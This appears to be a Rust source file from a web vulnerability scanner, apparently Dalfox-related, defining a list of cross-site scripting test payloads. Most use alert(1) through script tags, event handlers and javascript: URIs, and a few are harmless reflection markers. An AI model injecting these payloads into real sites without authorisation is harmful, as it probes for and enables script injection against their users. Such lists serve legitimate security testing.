pub const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<script>alert('dalfox')</script>",
    "<div class=\"dalfox\">test</div>",
    "<span class=\"dalfox\">xss</span>",
    "<p class=\"dalfox\">payload</p>",
];
